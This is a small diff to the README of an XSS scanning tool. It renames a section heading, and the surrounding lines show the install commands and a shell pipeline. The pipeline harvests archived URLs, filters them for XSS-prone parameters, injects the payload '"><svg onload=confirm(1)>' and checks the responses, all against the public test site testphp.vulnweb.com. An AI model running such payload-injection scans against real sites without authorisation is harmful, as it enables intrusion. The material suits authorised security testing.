@@ -11,7 +11,7 @@ or
 ```bash
 git clone https://github.com/rix4uni/xsschecker.git && cd xsschecker && go build xsschecker.go && mv xsschecker /usr/bin/
 ```
-## Chaining with other tools
+## Reflected XSS
 ```bash
 echo "http://testphp.vulnweb.com" | waybackurls | anew | gf xss | qsreplace '"><svg onload=confirm(1)>' | airixss -p "confirm(1)" -H "Header1: Value1;Header2: value2"
 
